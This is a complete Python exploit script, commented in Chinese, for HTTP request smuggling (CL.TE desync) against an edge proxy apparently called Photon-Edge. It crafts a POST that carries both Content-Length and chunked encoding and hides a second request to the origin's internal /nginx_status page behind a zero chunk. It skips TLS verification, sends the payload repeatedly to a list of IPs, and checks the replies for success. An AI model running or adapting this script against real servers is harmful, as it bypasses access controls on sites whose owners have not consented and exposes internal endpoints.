# Photon-Edge CL.TE desync —— 0-chunk 之后的字节被当成新请求转发源站
# 用法: python photon_edge_clte_smuggle.py <edge_ip>[,<edge_ip2>...]
# 说明: 仅 h1(ALPN=http/1.1)；跑前清空 *_proxy 环境变量，避免走本机代理。

import socket, ssl, os, sys, re, time

for k in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY"):
    os.environ.pop(k, None)

SNI  = "target485.example.com"          # 换成目标域名：TLS SNI 与 Host 都保持它
PATH = "/api/v1/settings/public"     # 外层请求随便挑一个存在但只回 404 的路径也可
SMUG_PATH = "/nginx_status"          # 走私目标：源站这台 127.0.0.1 的 stub_status

SMUG = ("GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: x\r\n\r\n" % SMUG_PATH).encode()
FUEL = ("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: x\r\nConnection: keep-alive\r\n\r\n" % (PATH, SNI)).encode()

def outer(cl):
    return ("POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: x\r\n"
            "X-Probe: desync\r\n"
            "Connection: keep-alive\r\n"
            "Content-Length: %d\r\n"
            "Transfer-Encoding: chunked\r\n\r\n" % (PATH, SNI, cl)).encode()

def io(ip, payload, timeout=6.0):
    s = socket.create_connection((ip, 443), timeout=timeout)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])          # 关键：禁止降/升到 h2
    s = ctx.wrap_socket(s, server_hostname=SNI); s.settimeout(timeout)
    s.sendall(payload)
    buf = b""
    while True:
        try: c = s.recv(65536)
        except socket.timeout: break
        if not c: break
        buf += c
        if len(buf) > 2*1024*1024: break
    try: s.close()
    except Exception: pass
    return buf.decode("latin-1", "replace")

def run(ip):
    # 外层 CL 取任意值（前端忽略 CL），0-chunk 终止后紧跟走私请求 + 一条正常收尾请求
    payload = outer(70) + b"0\r\n\r\n" + SMUG + FUEL
    raw = io(ip, payload)
    sts = re.findall(r"HTTP/1\.[01] (\d{3})", raw)
    hit = ("Active connections" in raw) and ("registration_enabled" in raw)
    print(ip, sts, "STUB=Y" if "Active connections" in raw else "STUB=-",
          "FOLLOW-OK" if "registration_enabled" in raw else "FOLLOW=-", "=>", "SMUGGLED" if hit else "no")
    return hit

if __name__ == "__main__":
    ips = sys.argv[1].split(",") if len(sys.argv) > 1 else ["192.0.2.8"]
    total = ok = 0
    for ip in ips:
        for _ in range(5):
            total += 1; ok += run(ip); time.sleep(0.4)
    print("success %d/%d" % (ok, total))
